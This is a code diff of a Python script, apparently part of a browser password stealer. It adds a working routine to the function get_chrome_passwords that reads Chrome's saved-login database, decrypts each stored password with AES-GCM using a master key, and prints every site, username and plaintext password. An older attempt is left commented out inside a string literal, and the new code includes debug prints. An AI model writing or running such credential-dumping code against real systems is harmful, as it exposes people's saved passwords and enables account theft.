@@ -27,16 +27,46 @@ def get_chrome_passwords():
     cursor = connection.cursor()
     #cursor.execute("PRAGMA table_info(logins);")
     #print(cursor.fetchall())
+    def dec(buffer):
+        iv = buffer[3:15]
+        enc_pass = buffer[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        print(iv,"---",enc_pass)
+        dec_pass =  cipher.decrypt(enc_pass)
+        return dec_pass[:-16].decode('utf-8')
+
+
+
+    try:
+        cursor.execute("SELECT action_url, origin_url, username_value, password_value FROM logins")
+        for r in cursor.fetchall():
+            action_url = r[0]
+            origin_url = r[1]
+            url = action_url if action_url else origin_url
+            username = r[2]
+            encrypt_pass = r[3]
+            decrypt_pass = dec(encrypt_pass)
+            print(url,"[+]",username,"[+]",decrypt_pass)
+    except Exception as e:
+        print(e)
+    connection.close()
+    sys.exit(0)
+
+
+
+    '''
     cursor.execute('SELECT origin_url, action_url, username_element, username_value, password_element, password_value from logins')
+    
     for line in cursor.fetchall():
         print(line)
         ciphertext = line[5]
         initialization_vector = ciphertext[3:15]
         encrypted_password = ciphertext[15:-16]
+        print(initialization_vector,"[+]",encrypted_password)
 
         cipher = AES.new(master_key, AES.MODE_GCM, initialization_vector)
         decrypted_pass = cipher.decrypt(encrypted_password)
-        print(decrypted_pass," ->check")
+        print(cipher.decrypt(encrypted_password)," ->check")'''
 
 
 
